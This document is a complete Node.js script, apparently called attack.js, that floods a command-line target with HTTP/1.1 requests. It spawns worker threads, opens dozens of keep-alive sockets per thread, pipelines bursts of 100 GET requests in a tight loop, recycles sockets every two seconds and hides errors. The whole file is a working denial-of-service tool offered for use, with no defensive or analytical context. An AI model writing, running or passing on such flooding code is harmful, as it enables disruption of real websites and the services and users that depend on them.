const net = require('net');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const { URL } = require('url');

const THREADS = Math.min(6, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const targetUrl = new URL(process.argv[2]);
    const duration = parseInt(process.argv[3]);

    console.log(`Launching HTTP/1.1 attack on ${targetUrl.hostname} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { hostname: targetUrl.hostname, port: targetUrl.port || 80, path: targetUrl.pathname || '/', duration } });
    }
} else {
    const { hostname, port, path, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function createH11Flood() {
        if (Date.now() > end) return;

        const socket = net.connect(port, hostname, () => {
            const req = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`;
            
            let interval = setInterval(() => {
                if (Date.now() > end || socket.destroyed) {
                    clearInterval(interval);
                    socket.destroy();
                    return;
                }
                for (let i = 0; i < 100; i++) {
                    socket.write(req);
                }
            }, 0);
        });

        socket.on('error', () => {});
        socket.on('close', () => {
            setTimeout(createH11Flood, 10);
        });

        setTimeout(() => {
            socket.destroy();
        }, 2000); // recycle socket every 2s
    }

    for (let i = 0; i < 50; i++) createH11Flood();
}
